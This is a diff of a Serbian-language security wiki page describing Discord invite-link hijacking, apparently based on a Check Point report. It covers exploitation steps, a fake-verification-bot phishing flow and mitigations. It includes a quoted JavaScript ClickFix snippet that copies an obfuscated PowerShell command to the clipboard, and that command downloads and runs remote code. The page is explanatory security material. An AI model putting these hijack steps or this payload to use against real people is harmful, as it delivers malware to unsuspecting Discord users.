@@ -1,41 +1,43 @@
-# Otmica Discord pozivnica
+# Hijacking Discord Invite linkova
 
-{{#include ../../banners/hacktricks-training.md}}
+Discord invite hijacking zloupotrebljava pravila ponovne upotrebe custom vanity linkova: istekli privremeni invite code ili obrisani permanent code sastavljen samo od malih slova i cifara može biti registrovan kao vanity link na serveru sa Level 3 Boost statusom. Custom vanity link takođe može postati dostupan kada njegov prvobitni server izgubi Level 3 Boost; za uppercase temporary invite, attacker može unapred registrovati lowercase vanity formu dok regularni invite ostaje aktivan, ali redirection počinje tek nakon isteka tog invite-a.<sup>[[1]](#references)[[2]](#references)</sup>
 
-Vulnerability u Discord sistemu pozivnica omogućava akterima pretnji da preuzmu istekle ili obrisane invite kodove (privremene, trajne ili prilagođene vanity) kao nove vanity linkove na bilo kom serveru sa Level 3 Boost-om. Normalizacijom svih kodova u mala slova, napadači mogu unapred registrovati poznate invite kodove i neprimetno preusmeriti saobraćaj kada originalni link istekne ili izvorni server izgubi svoj boost.<sup>[[1]](#references)[[2]](#references)</sup>
+## Tipovi invite-ova i rizik od hijacking-a
 
-## Tipovi pozivnica i rizik od otmice
+Uočeni rizik razlikuje se u zavisnosti od tipa invite-a:<sup>[[1]](#references)[[2]](#references)</sup>
 
-| Tip pozivnice           | Može li biti oteta? | Uslov / komentari                                                                                       |
-|-----------------------|-------------|------------------------------------------------------------------------------------------------------------|
-| Privremeni invite link | ✅          | Nakon isteka, kod postaje dostupan i boosted server može ponovo da ga registruje kao vanity URL. |
-| Trajni invite link | ⚠️          | Ako je obrisan i sastoji se samo od malih slova i cifara, kod može ponovo postati dostupan.        |
-| Prilagođeni vanity link    | ✅          | Ako originalni server izgubi svoj Level 3 Boost, njegov vanity invite postaje dostupan za novu registraciju.    |
+| Tip invite-a          | Može li biti hijack-ovan? | Uslov / komentari                                                                                       |
+|-----------------------|---------------------------|-----------------------------------------------------------------------------------------------------------|
+| Temporary Invite Link | ✅                        | Nakon isteka, code postaje dostupan i boosted server može ponovo da ga registruje kao vanity URL.       |
+| Permanent Invite Link | ⚠️                        | Ako je obrisan i sastoji se samo od malih slova i cifara, code može ponovo postati dostupan.              |
+| Custom Vanity Link    | ✅                        | Ako prvobitni server izgubi Level 3 Boost, njegov vanity invite postaje dostupan za novu registraciju.   |
 
 ## Koraci eksploatacije
 
-1. Izviđanje
-- Pratite javne izvore (forume, društvene mreže, Telegram kanale) u potrazi za invite linkovima koji odgovaraju obrascu `discord.gg/{code}` ili `discord.com/invite/{code}`.<sup>[[1]](#references)</sup>
-- Prikupite invite kodove od interesa (privremene ili vanity).
-2. Pre-registracija
-- Kreirajte ili upotrebite postojeći Discord server sa privilegijama Level 3 Boost-a.
-- U **Server Settings → Vanity URL**, pokušajte da dodelite ciljani invite kod. Ako je prihvaćen, kod je rezervisan na serveru napadača.
-3. Aktiviranje otmice
-- Kod privremenih invite-ova, sačekajte da originalni invite istekne (ili ga ručno obrišite ako kontrolišete izvor).
-- Kod kodova koji sadrže velika slova, varijanta sa malim slovima može odmah da se preuzme, iako se preusmeravanje aktivira tek nakon isteka.
-4. Neprimetno preusmeravanje
-- Korisnici koji posećuju stari link neprimetno se šalju na server pod kontrolom napadača kada otmica postane aktivna.
+1. Reconnaissance
+- Pratite javne izvore (forume, društvene mreže, Telegram channels) za invite linkove koji odgovaraju obrascu `discord.gg/{code}` ili `discord.com/invite/{code}`.<sup>[[1]](#references)</sup>
+- Prikupite invite codes od interesa (temporary ili vanity).<sup>[[1]](#references)</sup>
+2. Pre-registration
+- Kreirajte novi ili upotrebite postojeći Discord server sa Level 3 Boost privilegijama.<sup>[[1]](#references)[[2]](#references)</sup>
+- U **Server Settings → Vanity URL**, pokušajte da dodelite ciljani invite code. Ako bude prihvaćen, malicious server rezerviše code.<sup>[[1]](#references)</sup>
+3. Hijack Activation
+- Za temporary invite-ove, sačekajte da prvobitni invite istekne (ili ga ručno obrišite ako kontrolišete source).<sup>[[1]](#references)</sup>
+- Za code-ove koji sadrže uppercase slova, lowercase varijanta može odmah da se claim-uje, iako se redirection aktivira tek nakon isteka.<sup>[[1]](#references)</sup>
+4. Silent Redirection
+- Korisnici koji posećuju stari link neprimetno se preusmeravaju na server pod kontrolom attackera kada hijack postane aktivan.<sup>[[1]](#references)</sup>
 
 ## Phishing tok preko Discord servera
 
-1. Ograničite kanale servera tako da bude vidljiv samo kanal **#verify**.<sup>[[1]](#references)</sup>
-2. Postavite bot (npr. **Safeguard#0786**) koji će nove korisnike podstaći da se verifikuju putem OAuth2.
-3. Bot preusmerava korisnike na phishing sajt (npr. `captchaguard.me`) pod izgovorom CAPTCHA ili koraka za verifikaciju.
-4. Implementirajte **ClickFix** UX trik:
-- Prikažite poruku o neispravnom CAPTCHA izazovu.
-- Uputite korisnike da otvore dijalog **Win+R**, nalepе unapred pripremljenu PowerShell komandu i pritisnu Enter.
+1. Ograničite server channels tako da bude vidljiv samo **#verify** channel.<sup>[[1]](#references)</sup>
+2. Deploy-ujte bot (npr. **Safeguard#0786**) koji novim korisnicima prikazuje zahtev da se verifikuju putem OAuth2.<sup>[[1]](#references)</sup>
+3. Bot preusmerava korisnike na phishing sajt (npr. `captchaguard.me`) pod izgovorom CAPTCHA ili verification koraka.<sup>[[1]](#references)</sup>
+4. Implementirajte **ClickFix** UX trik:<sup>[[1]](#references)</sup>
+- Prikažite poruku o neispravnom CAPTCHA-u.
+- Uputite korisnike da otvore **Win+R** dijalog, nalepе unapred učitanu PowerShell komandu i pritisnu Enter.
 
 ### Primer ClickFix Clipboard Injection-a
+
+Campaign je koristio JavaScript za kopiranje malicious PowerShell komande u clipboard:<sup>[[1]](#references)</sup>
 ```javascript
 // Copy malicious PowerShell command to clipboard
 const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
@@ -44,18 +46,17 @@ const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9
 `iex (iwr -Uri $url)"`;
 navigator.clipboard.writeText(cmd);
 ```
-Ovaj pristup izbegava direktna preuzimanja datoteka i koristi poznate UI elemente kako bi smanjio sumnju korisnika.<sup>[[1]](#references)</sup>
+Ovaj pristup izbegava direktno preuzimanje datoteka i koristi poznate UI elemente kako bi smanjio sumnju korisnika.<sup>[[1]](#references)</sup>
 
-## Mere zaštite
+## Mitigations
 
-- Koristite stalne invite linkove koji sadrže najmanje jedno veliko slovo ili znak koji nije alfanumerički (ne ističu i ne mogu se ponovo koristiti).<sup>[[1]](#references)</sup>
-- Redovno menjajte invite kodove i opozivajte stare linkove.
-- Pratite status boostovanja Discord servera i preuzimanje vanity URL-ova.
-- Obučite korisnike da provere autentičnost servera i izbegavaju izvršavanje komandi nalepljenih iz clipboarda.
+- Prednost dati trajnim invite linkovima i obezbediti da kod sadrži najmanje jedno veliko slovo; obrisani trajni kodovi koji sadrže velika slova ne mogu se ponovo koristiti kao vanity linkovi.<sup>[[1]](#references)</sup>
+- Redovno menjati invite kodove i opozivati stare linkove.
+- Pratiti status boostovanja Discord servera i preuzimanje vanity URL-ova.<sup>[[1]](#references)[[2]](#references)</sup>
+- Edukovati korisnike da proveravaju autentičnost servera i izbegavaju izvršavanje komandi nalep­ljenih iz clipboarda.
 
-## Reference
+## References
 
-- [1] [From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
-- [2] [Custom Invite Link – Discord Support](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)
-
+- [1] [Od poverenja do pretnje: Hijacked Discord Invites korišćeni za višefaznu isporuku malware-a](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
+- [2] [Prilagođeni Invite Link – Discord podrška](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)
 {{#include ../../banners/hacktricks-training.md}}
